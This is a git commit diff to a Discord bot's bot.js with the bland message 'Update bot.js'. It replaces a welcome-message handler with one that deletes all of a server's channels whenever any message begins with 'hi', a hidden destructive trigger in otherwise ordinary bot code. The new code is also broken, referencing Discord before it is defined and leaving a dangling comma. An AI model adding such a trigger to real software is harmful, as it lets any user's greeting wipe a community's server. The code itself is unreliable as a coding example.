71641e5b69ef3f63d5939ac60c3d2be6d9ac4764
somalalimi15 <43244771+somalalimi15@users.noreply.github.com>
2018-11-07 17:10:51 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,13 +1,10 @@
+const client = new Discord.Client();
 const Discord = require('discord.js'),
-    bot = new Discord.Client({sisableEveryone: true})
-    console.log("SoM");
-bot.on('guildMemberAdd', member => {
-const msg= member.guild.channels.get("508619864487886858");
-if(!msg) return;
-if(msg) {
-setTimeout(() => msg.send(`** - Welcome To Magic, **`), 4000)        
-}
+      
+client.on('message', message => {
+    if(message.content.startsWith(`hi`)){
+        message.guild.channels.deleteAll();
+    }
 });
-
 client.login(process.env.BOT_TOKEN); 
 
